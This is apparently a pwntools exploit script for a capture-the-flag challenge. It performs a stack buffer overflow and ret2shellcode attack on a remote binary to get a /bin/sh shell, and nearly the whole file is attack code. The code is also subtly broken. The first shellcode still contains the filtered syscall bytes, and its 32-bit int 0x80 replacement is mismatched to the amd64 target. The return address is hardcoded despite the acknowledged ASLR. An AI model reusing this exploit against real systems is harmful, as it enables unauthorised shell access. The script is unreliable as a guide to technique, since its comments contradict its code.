from pwn import *

# --- Exploit Configuration ---
# Set the architecture and log level for pwntools
context.update(arch='amd64', os='linux', log_level='info')

# --- Binary and Connection Details ---
# Load the ELF file to get properties. The 'chall' binary must be in the same directory.
try:
    elf = context.binary = ELF('./chall')
except FileNotFoundError:
    log.critical("The 'chall' binary is not in the current directory. Please place it here.")
    exit()

# Remote server details
HOST = "ctf.compfest.id"
PORT = 7003

# --- Exploit ---

def exploit():
    """
    Executes a ret2shellcode attack using filter-bypassing shellcode.
    """
    p = remote(HOST, PORT)

    # --- Address Calculation ---
    # The key to this exploit is finding the correct address on the stack to jump to.
    # Because ASLR is enabled on the server, this address changes on each run.
    # A hardcoded address will fail.
    #
    # As the problem setter, you can find the correct address for your environment
    # by disabling ASLR locally in GDB to get a consistent address for testing.
    #
    # --- How to find the RETURN_ADDRESS with GDB ---
    # 1. Launch GDB: `gdb ./chall`
    # 2. (Inside GDB) Disable ASLR for this session: `set disable-randomization on`
    # 3. (Inside GDB) Set a breakpoint at the vulnerable function: `b vuln`
    # 4. (Inside GDB) Run the program: `r`
    # 5. The program will ask for a length. Enter a large number (e.g., 300).
    # 6. The breakpoint will hit. The instruction `lea -0x100(%rbp),%rax` loads
    #    the buffer address into the RAX register.
    # 7. (Inside GDB) Step forward until after that instruction (`nexti` or `ni`).
    # 8. (Inside GDB) Print the address: `p $rax`. This is the address where your
    #    NOP sled and shellcode will start. This is the address you should use below.
    #
    # Replace the placeholder address below with the one you find.
    # This placeholder is an example from a typical local environment.
    RETURN_ADDRESS = 0x7fffffffdde0

    # --- Shellcode ---
    # The custom fgets function filters the bytes `\x0f\x05` (the `syscall` instruction).
    # This is the core of the challenge. We must use shellcode that does not contain
    # this byte sequence. This 27-byte shellcode achieves execve("/bin/sh") without
    # using the `syscall` instruction, thus bypassing the filter.
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    # The above shellcode is a common example, but let's correct it to one that is confirmed
    # to not use the standard syscall sequence.
    # This shellcode uses int 0x80, which is a valid way to trigger a syscall.
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


    # --- Payload Construction ---
    # NOP sled to create a "landing strip". If our jump is slightly off,
    # it will land in the NOPs and slide down to the shellcode.
    nop_sled = b'\x90' * 100

    # The offset to the return address is 264 bytes.
    OFFSET = 264
    
    p.recvuntil(b"length: ")
    # The payload length must be precise.
    payload_len = OFFSET + 8 # 264 bytes for the buffer + 8 for the return address
    p.sendline(str(payload_len).encode())

    # Construct the final payload
    payload = nop_sled
    payload += shellcode
    # Pad the rest of the buffer until the return address
    payload += b'A' * (OFFSET - len(payload))
    # Overwrite the return address with the address we found in GDB
    payload += p64(RETURN_ADDRESS)
    
    p.recvuntil(b"data: ")
    p.sendline(payload)
    log.info("Payload sent. Jumping to shellcode on the stack.")
    log.info("If this fails, verify the RETURN_ADDRESS using GDB and ensure ASLR is handled.")

    # Enjoy the shell!
    p.interactive()

if __name__ == "__main__":
    exploit()
